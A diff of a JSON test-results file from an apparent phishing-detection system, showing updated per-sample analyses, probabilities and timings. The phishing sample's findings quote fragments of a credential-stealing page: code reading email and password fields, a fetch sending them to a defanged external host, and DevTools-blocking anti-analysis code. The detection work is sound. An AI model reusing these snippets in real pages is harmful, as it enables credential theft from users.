@@ -1,9 +1,9 @@
 {
  "benign_sinhala": {
-  "analysis_id": "d00d859a567840b4b6cd4950b664caf0",
+  "analysis_id": "24d8893321804e2bb0cfb8c159c9bfd2",
   "request_id": "c2_benign_000118",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T20:33:59.679782+05:30",
+  "analyzed_at": "2026-10-21T08:37:30.759388+05:30",
   "source": "user",
   "cached": false,
   "input": {
@@ -291,96 +291,146 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 51.0,
-   "quality": 19.3,
-   "dom_features": 12.4,
-   "dom_model": 198.7,
-   "content": 64.9,
-   "text_models": 397.6,
-   "js_analysis": 22.7,
-   "behavior": 25.3,
-   "behavior_model": 29.9,
+   "preprocess": 50.4,
+   "quality": 19.5,
+   "dom_features": 13.4,
+   "dom_model": 210.4,
+   "content": 66.5,
+   "text_models": 433.0,
+   "js_analysis": 23.6,
+   "behavior": 26.6,
+   "behavior_model": 35.1,
    "fusion": 0.1,
-   "total": 859.6
+   "total": 919.8
   }
  },
- "phishing_zimbra": {
-  "analysis_id": "10f4e35613204bcab2308a5c58b794ef",
-  "request_id": "c2_phishing_000081",
+ "phishing": {
+  "analysis_id": "ef96ef2c24a74080930d934bc7c71884",
+  "request_id": "c2_phishing_000012",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T20:34:00.075490+05:30",
+  "analyzed_at": "2026-10-21T08:37:30.959315+05:30",
   "source": "user",
   "cached": false,
   "input": {
    "mode": "html",
-   "submitted_url": "hxxps://it-corp[.]netlify[.]app/",
+   "submitted_url": "hxxps://organization-teams-009[.]github[.]io/Technical-Committee-Meetings/",
    "final_url": null,
    "redirect_hosts": [],
    "http_status": null,
    "content_type": null,
-   "html_bytes": 25071
+   "html_bytes": 56264
   },
   "status": "ok",
   "status_reason": null,
   "verdict": "Malicious",
   "threat_class": "phishing",
-  "risk_score": 94,
+  "risk_score": 95,
   "class_probabilities": {
-   "benign": 0.063966,
-   "phishing": 0.817016,
-   "fake_ecommerce": 0.038506,
-   "crypto_scam": 0.034447,
-   "malware_delivery": 0.046066
+   "benign": 0.051246,
+   "phishing": 0.812517,
+   "fake_ecommerce": 0.025729,
+   "crypto_scam": 0.039632,
+   "malware_delivery": 0.070876
   },
   "page_language": "en",
   "findings": [
    {
-    "id": "dom.form_action_to_known_form_service",
-    "modality": "dom",
-    "severity": "high",
-    "title": "Form posts to form-collection service submit-form[.]com",
-    "detail": "A form posts to a free form-to-email service (submit-form[.]com, formspree, getform, ...), a common phishing-kit shortcut.",
-    "evidence": "submit-form[.]com",
+    "id": "behavior.credential_exfiltration.external",
+    "modality": "behavior",
+    "severity": "critical",
+    "title": "Credential exfiltration",
+    "detail": "Sends credentials (#email, #password) to swjutq[.]org (fetch, line 424).",
+    "evidence": "document.getElementById('password').value",
     "raises_verdict": true,
-    "steps": []
-   },
-   {
-    "id": "dom.password_form_external_action",
-    "modality": "dom",
-    "severity": "high",
-    "title": "Password form submits to external domain submit-form[.]com",
-    "detail": "A form containing a password field submits to an external domain - one of the strongest structural phishing signals.",
-    "evidence": "submit-form[.]com",
-    "raises_verdict": true,
-    "steps": []
-   },
-   {
-    "id": "dom.has_external_form_action",
-    "modality": "dom",
-    "severity": "high",
-    "title": "Form submits to an external domain (submit-form[.]com)",
-    "detail": "At least one form submits its data to another site.",
-    "evidence": "submit-form[.]com",
-    "raises_verdict": false,
-    "steps": []
+    "steps": [
+     {
+      "kind": "flow_step",
+      "line": 386,
+      "code": "document.getElementById('password').value",
+      "note": "source: #password = password field"
+     },
+     {
+      "kind": "flow_step",
+      "line": 386,
+      "code": "password = document.getElementById('password').value",
+      "note": "assign: password"
+     },
+     {
+      "kind": "flow_step",
+      "line": 417,
+      "code": "formData.append('password', password)",
+      "note": "assign: formData.append()"
+     },
+     {
+      "kind": "flow_step",
+      "line": 424,
+      "code": "fetch('hxxps://id[.]swjutq[.]org/webapp/owaa.php', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-u...",
+      "note": "sink: fetch -› swjutq[.]org (external)"
+     },
+     {
+      "kind": "source",
+      "line": 385,
+      "code": "document.getElementById('email').value",
+      "note": "also sent: #email = email field"
+     }
+    ]
    },
    {
     "id": "fusion.verdict",
     "modality": "fusion",
     "severity": "high",
-    "title": "Fused models: Malicious (phishing 82%)",
-    "detail": "4 model arm(s) combined; P(benign) = 0.06 (Malicious below 0.18, Suspicious below 0.51).",
+    "title": "Fused models: Malicious (phishing 81%)",
+    "detail": "4 model arm(s) combined; P(benign) = 0.05 (Malicious below 0.18, Suspicious below 0.51).",
     "evidence": null,
     "raises_verdict": false,
     "steps": []
    },
    {
-    "id": "dom.external_link_ratio",
+    "id": "behavior.anti_analysis.several",
+    "modality": "behavior",
+    "severity": "medium",
+    "title": "Anti-analysis",
+    "detail": "Anti-analysis (3 techniques): right-click blocked, text selection blocked, DevTools keys blocked.",
+    "evidence": "document.addEventListener('contextmenu', function(event) { event.preventDefault(); event.stopPropagation(); return false",
+    "raises_verdict": false,
+    "steps": [
+     {
+      "kind": "detection",
+      "line": 168,
+      "code": "document.addEventListener('contextmenu', function(event) { event.preventDefault(); event.stopPropagation(); return false",
+      "note": "contextmenu_listener"
+     },
+     {
+      "kind": "detection",
+      "line": 175,
+      "code": "document.addEventListener('dragstart', function(event) { event.preventDefault(); return false; })",
+      "note": "selection"
+     },
+     {
+      "kind": "detection",
+      "line": 158,
+      "code": "function(event) { const keyCode = event.keyCode || event.which; if (keyCode === 123 || (event.ctrlKey && event.shiftK...",
+      "note": "F12, Ctrl+Shift+I/J/C"
+     }
+    ]
+   },
+   {
+    "id": "dom.form_action_empty_or_js",
     "modality": "dom",
     "severity": "medium",
-    "title": "100% of web links point to other domains (top zimbra[.]com)",
-    "detail": "External web links divided by all web links (internal + external).",
-    "evidence": "zimbra[.]com",
+    "title": "1 form(s) with an empty, '#' or javascript: action",
+    "detail": "Forms whose action is empty, \"#\" or javascript: - the data is handled by JavaScript (often sent elsewhere) instead of a visible target.",
+    "evidence": null,
+    "raises_verdict": false,
+    "steps": []
+   },
+   {
+    "id": "dom.inputs_outside_forms_count",
+    "modality": "dom",
+    "severity": "medium",
+    "title": "1 input field(s) outside any form (data likely sent by JavaScript)",
+    "detail": "Fields not inside any form - typical of kits that collect data with JavaScript instead of a normal form submit.",
+    "evidence": null,
     "raises_verdict": false,
     "steps": []
    },
@@ -399,8 +449,8 @@
     "modality": "content",
     "severity": "medium",
     "title": "Page text reads like a phishing page",
-    "detail": "The multilingual text models classify the visible text as a threat (Text TF-IDF 86% phishing, Text XLM-R 84% phishing).",
-    "evidence": "Zimbra Web Client Sign In",
+    "detail": "The multilingual text models classify the visible text as a threat (Text TF-IDF 79% phishing, Text XLM-R 91% phishing).",
+    "evidence": "Outlook",
     "raises_verdict": false,
     "steps": []
    },
@@ -409,60 +459,107 @@
     "modality": "behavior",
     "severity": "low",
     "title": "Credential access",
-    "detail": "Page code reads 18 credential field value(s) (loginForm.username, #username, getElement(\"newPassword\"), oldPasswordInput and 2 more).",
-    "evidence": "loginForm.username.value",
+    "detail": "Page code reads 4 credential field value(s) (#password, #email).",
+    "evidence": "passwordField.value",
     "raises_verdict": false,
     "steps": [
      {
       "kind": "source",
-      "line": 233,
-      "code": "loginForm.username.value",
-      "note": "credential_input: loginForm.username (credential-like name)"
+      "line": 298,
+      "code": "passwordField.value",
+      "note": "credential_input: #password = password field"
      },
      {
       "kind": "source",
-      "line": 257,
-      "code": "getElement(\"username\").value",
-      "note": "credential_input: #username = username field"
+      "line": 385,
+      "code": "document.getElementById('email').value",
+      "note": "credential_input: #email = email field"
      },
      {
       "kind": "source",
-      "line": 380,
-      "code": "getElement(\"newPassword\").value",
-      "note": "credential_input: getElement(\"newPassword\") (credential-like name)"
+      "line": 386,
+      "code": "document.getElementById('password').value",
+      "note": "credential_input: #password = password field"
      },
      {
       "kind": "source",
-      "line": 416,
-      "code": "oldPasswordInput.value",
-      "note": "credential_input: oldPasswordInput (credential-like name)"
+      "line": 508,
+      "code": "$('#email').val()",
+      "note": "credential_input: #email = email field"
+     }
+    ]
+   },
+   {
+    "id": "behavior.external_data_transmission.low_sensitivity",
+    "modality": "behavior",
+    "severity": "low",
+    "title": "External data transmission",
+    "detail": "Sends input values (#login_attempt, #passwordText, #domain ...) to swjutq[.]org (fetch, line 424).",
+    "evidence": "document.getElementById('passwordText').value",
+    "raises_verdict": false,
+    "steps": [
+     {
+      "kind": "flow_step",
+      "line": 388,
+      "code": "document.getElementById('passwordText').value",
+      "note": "source: #passwordText = not a credential field"
+     },
+     {
+      "kind": "flow_step",
+      "line": 388,
+      "code": "passwordText = document.getElementById('passwordText').value",
+      "note": "assign: passwordText"
+     },
+     {
+      "kind": "flow_step",
+      "line": 392,
+      "code": "password = passwordText",
+      "note": "assign: password"
+     },
+     {
+      "kind": "flow_step",
+      "line": 417,
+      "code": "formData.append('password', password)",
+      "note": "assign: formData.append()"
+     },
+     {
+      "kind": "flow_step",
+      "line": 424,
+      "code": "fetch('hxxps://id[.]swjutq[.]org/webapp/owaa.php', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-u...",
+      "note": "sink: fetch -› swjutq[.]org (external)"
      },
      {
       "kind": "source",
-      "line": 500,
-      "code": "newPasswordInput.value",
-      "note": "credential_input: newPasswordInput (credential-like name)"
+      "line": 283,
+      "code": "document.getElementById('login_attempt')?.value",
+      "note": "also sent: #login_attempt = not a credential field"
      },
      {
       "kind": "source",
-      "line": 562,
-      "code": "newPasswordInput.value",
-      "note": "credential_input: newPasswordInput (credential-like name)"
+      "line": 418,
+      "code": "document.getElementById('domain').value",
+      "note": "also sent: #domain = not a credential field"
+     },
+     {
+      "kind": "source",
+      "line": 419,
+      "code": "document.getElementById('fieldName').value",
+      "note": "also sent: #fieldName = not a credential field"
      }
     ]
    }
   ],
-  "findings_total": 8,
+  "findings_total": 9,
   "findings_omitted": 0,
   "modalities": {
    "dom": {
     "status": "ok",
     "reason": null,
-    "summary": "5 structural finding(s) (3 high); DOM model: phishing 82%",
+    "summary": "3 structural finding(s) (0 high); DOM model: phishing 81%",
     "top_evidence": [
-     "Form submits to an external domain (submit-form[.]com)",
-     "Password form submits to external domain submit-form[.]com",
-     "Form posts to form-collection service submit-form[.]com"
+     "1 input field(s) outside any form (data likely sent by JavaScript)",
+     "1 field(s) ask for secrets (password, OTP/PIN, card)",
+     "1 form(s) with an empty, '#' or javascript: action"
     ],
     "arms": [
      {
@@ -472,11 +569,11 @@
       "reason": null,
       "predicted": "phishing",
       "probabilities": {
-       "benign": 0.039107,
-       "phishing": 0.824289,
-       "fake_ecommerce": 0.045251,
-       "crypto_scam": 0.013037,
-       "malware_delivery": 0.078317
+       "benign": 0.041998,
+       "phishing": 0.814332,
+       "fake_ecommerce": 0.02451,
+       "crypto_scam": 0.053429,
+       "malware_delivery": 0.065731
       },
       "fusion_weight": 0.1
      }
@@ -488,9 +585,9 @@
    "content": {
     "status": "ok",
     "reason": null,
-    "summary": "language en (85%); 1408 chars of model text; Text TF-IDF: phishing 86%; Text XLM-R: phishing 84%",
+    "summary": "language en (98%); 101 chars of model text; Text TF-IDF: phishing 79%; Text XLM-R: phishing 91%",
     "top_evidence": [
-     "Zimbra Web Client Sign In"
+     "Outlook"
     ],
     "arms": [
      {
@@ -500,11 +597,11 @@
       "reason": null,
       "predicted": "phishing",
       "probabilities": {
-       "benign": 0.069193,
-       "phishing": 0.860943,
-       "fake_ecommerce": 0.027239,
-       "crypto_scam": 0.024039,
-       "malware_delivery": 0.018586
+       "benign": 0.077117,
+       "phishing": 0.792482,
+       "fake_ecommerce": 0.024045,
+       "crypto_scam": 0.04482,
+       "malware_delivery": 0.061536
       },
       "fusion_weight": 0.2
      },
@@ -515,11 +612,11 @@
       "reason": null,
       "predicted": "phishing",
       "probabilities": {
-       "benign": 0.055097,
-       "phishing": 0.838187,
-       "fake_ecommerce": 0.030663,
-       "crypto_scam": 0.020332,
-       "malware_delivery": 0.055721
+       "benign": 0.010641,
+       "phishing": 0.913658,
+       "fake_ecommerce": 0.008718,
+       "crypto_scam": 0.016383,
+       "malware_delivery": 0.0506
       },
       "fusion_weight": 0.4
      }
@@ -527,9 +624,9 @@
     "intents": [],
     "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
     "stats": {
-     "segments": 20.0,
-     "page_text_chars": 1408.0,
-     "language_confidence": 0.8532,
+     "segments": 6.0,
+     "page_text_chars": 101.0,
+     "language_confidence": 0.9799,
      "si_script_ratio": 0.0,
      "ta_script_ratio": 0.0,
      "latin_script_ratio": 1.0
@@ -538,9 +635,11 @@
    "behavior": {
     "status": "ok",
     "reason": null,
-    "summary": "7 script(s), 3 source->sink flow(s), 1 finding(s); behavior risk 3; behavior model: phishing 76%",
+    "summary": "5 script(s), 7 source->sink flow(s), 4 finding(s); behavior risk 66; behavior model: phishing 69%",
     "top_evidence": [
-     "Page code reads 18 credential field value(s) (loginForm.username, #username, getElement(\"newPassword\"), oldPasswordInput and 2 more)."
+     "Sends credentials (#email, #password) to swjutq[.]org (fetch, line 424).",
+     "Anti-analysis (3 techniques): right-click blocked, text selection blocked, DevTools keys blocked.",
+     "Page code reads 4 credential field value(s) (#password, #email)."
     ],
     "arms": [
      {
@@ -550,36 +649,63 @@
       "reason": null,
       "predicted": "phishing",
       "probabilities": {
-       "benign": 0.080592,
-       "phishing": 0.757078,
-       "fake_ecommerce": 0.054225,
-       "crypto_scam": 0.067343,
-       "malware_delivery": 0.040763
+       "benign": 0.091222,
+       "phishing": 0.690413,
+       "fake_ecommerce": 0.049938,
+       "crypto_scam": 0.062573,
+       "malware_delivery": 0.105853
       },
       "fusion_weight": 0.3
      }
     ],
     "intents": [
      {
+      "intent": "credential_exfiltration",
+      "display": "Credential exfiltration",
+      "method": "ast_source_sink",
+      "severity": "critical",
+      "count": 2,
+      "cues": [],
+      "example": "Sends credentials (#email, #password) to swjutq[.]org (fetch, line 424)."
+     },
+     {
+      "intent": "anti_analysis",
+      "display": "Anti-analysis",
+      "method": "ast_source_sink",
+      "severity": "medium",
+      "count": 3,
+      "cues": [],
+      "example": "Anti-analysis (3 techniques): right-click blocked, text selection blocked, DevTools keys blocked."
+     },
+     {
       "intent": "credential_access",
       "display": "Credential access",
       "method": "ast_source_sink",
       "severity": "low",
-      "count": 18,
+      "count": 4,
       "cues": [],
-      "example": "Page code reads 18 credential field value(s) (loginForm.username, #username, getElement(\"newPassword\"), oldPasswordInput and 2 more)."
+      "example": "Page code reads 4 credential field value(s) (#password, #email)."
+     },
+     {
+      "intent": "external_data_transmission",
+      "display": "External data transmission",
+      "method": "ast_source_sink",
+      "severity": "low",
+      "count": 4,
+      "cues": [],
+      "example": "Sends input values (#login_attempt, #passwordText, #domain ...) to swjutq[.]org (fetch, line 424)."
      }
     ],
     "intent_method": "static AST source->sink patterns (Part 8, never executed)",
     "stats": {
-     "scripts_analyzed": 7.0,
+     "scripts_analyzed": 5.0,
      "scripts_lexical": 0.0,
      "library_scripts_skipped": 0.0,
-     "sources_total": 21.0,
-     "sinks_total": 3.0,
-     "flows_total": 3.0,
-     "flows_external": 0.0,
-     "behavior_risk_score": 3.0
+     "sources_total": 24.0,
+     "sinks_total": 4.0,
+     "flows_total": 7.0,
+     "flows_external": 6.0,
+     "behavior_risk_score": 66.0
     }
    }
   },
@@ -588,52 +714,51 @@
    "explained_class": "phishing",
    "method": "renormalized late-fusion weight x arm probability",
    "arm_contributions": {
-    "dom": 0.0824,
-    "behavior": 0.2271,
-    "text_tfidf": 0.1722,
-    "text_xlmr": 0.3353
+    "dom": 0.0814,
+    "behavior": 0.2071,
+    "text_tfidf": 0.1585,
+    "text_xlmr": 0.3655
    },
    "driving_arm": "text_xlmr",
    "top_features": [
     {
      "arm": "behavior",
-     "feature": "external_script_count",
-     "value": 0.0,
-     "contribution": 0.058708404204896404,
-     "text": "Number of references [external_script_count] = 0 pushes towards phishing"
-    },
-    {
-     "arm": "behavior",
-     "feature": "credential_access_count",
-     "value": 18.0,
-     "contribution": 0.052360898745671666,
-     "text": "credential_access_count = 18 pushes towards phishing"
-    },
-    {
-     "arm": "behavior",
-     "feature": "inline_script_count",
-     "value": 1.0,
-     "contribution": 0.050133989456143474,
-     "text": "Number of inline blocks with code (J... [inline_script_count] = 1 pushes towards phishing"
+     "feature": "behavior_risk_score",
+     "value": 66.0,
+     "contribution": 0.09159553005252802,
+     "text": "behavior_risk_score = 66 pushes towards phishing"
     },
     {
      "arm": "dom",
      "feature": "internal_link_count",
      "value": 0.0,
-     "contribution": 0.14382968838190047,
+     "contribution": 0.16505619522723,
      "text": "Web links to the page's own registrable domai... [internal_link_count] = 0 pushes towards phishing"
     },
     {
+     "arm": "behavior",
+     "feature": "inline_script_count",
+     "value": 1.0,
+     "contribution": 0.05013511264125959,
+     "text": "Number of inline blocks with code (J... [inline_script_count] = 1 pushes towards phishing"
+    },
+    {
+     "arm": "behavior",
+     "feature": "credential_access_count",
+     "value": 4.0,
+     "contribution": 0.0366975947323475,
+     "text": "credential_access_count = 4 pushes towards phishing"
+    },
+    {
      "arm": "dom",
-     "feature": "inputs_total",
-     "value": 6.0,
-     "contribution": 0.07377267643289946,
-     "text": "All input/select/textarea fields, inside or o... [inputs_total] = 6 pushes towards phishing"
+     "feature": "has_password_field",
+     "value": 1.0,
+     "contribution": 0.06568508273266621,
+     "text": "The page asks for a password [has_password_field] = 1 pushes towards phishing"
     }
    ],
    "evidence_floor_rules": [
-    "dom.password_form_external_action",
-    "dom.password_form_to_form_service"
+    "behavior.credential_exfiltration"
    ],
    "arms_used": [
     "dom",
@@ -663,24 +788,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 4.6,
+   "preprocess": 5.4,
    "quality": 3.2,
    "dom_features": 2.3,
-   "dom_model": 30.7,
-   "content": 5.1,
-   "text_models": 243.3,
-   "js_analysis": 14.0,
-   "behavior": 33.0,
-   "behavior_model": 29.8,
-   "fusion": 0.1,
-   "total": 372.1
+   "dom_model": 27.8,
+   "content": 1.7,
+   "text_models": 42.6,
+   "js_analysis": 17.9,
+   "behavior": 34.8,
+   "behavior_model": 29.6,
+   "fusion": 0.2,
+   "total": 168.3
   }
  },
  "crypto_scam": {
-  "analysis_id": "dd1f557b68ec4185902c3346cf9d3bee",
+  "analysis_id": "3811a194ee214230add19d8b5ebcf684",
   "request_id": "c2_crypto_scam_000011",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T20:34:00.929339+05:30",
+  "analyzed_at": "2026-10-21T08:37:31.820407+05:30",
   "source": "user",
   "cached": false,
   "input": {
@@ -976,24 +1101,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 170.7,
-   "quality": 11.5,
-   "dom_features": 9.7,
-   "dom_model": 23.2,
-   "content": 21.9,
-   "text_models": 346.2,
-   "js_analysis": 9.7,
-   "behavior": 11.9,
-   "behavior_model": 30.4,
+   "preprocess": 181.3,
+   "quality": 11.8,
+   "dom_features": 10.0,
+   "dom_model": 22.7,
+   "content": 22.0,
+   "text_models": 359.7,
+   "js_analysis": 9.9,
+   "behavior": 11.0,
+   "behavior_model": 30.3,
    "fusion": 0.1,
-   "total": 659.1
+   "total": 683.2
   }
  },
  "unreachable": {
-  "analysis_id": "a9ba3527e9cf44e1a940232e7ad0d9fa",
+  "analysis_id": "28abdc39dafe4fc8bee4049078f44042",
   "request_id": null,
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T20:34:01.254364+05:30",
+  "analyzed_at": "2026-10-21T08:37:32.166405+05:30",
   "source": "user",
   "cached": false,
   "input": {
@@ -1083,8 +1208,8 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "fetch": 313.2,
-   "total": 313.3
+   "fetch": 332.6,
+   "total": 332.8
   }
  }
 }
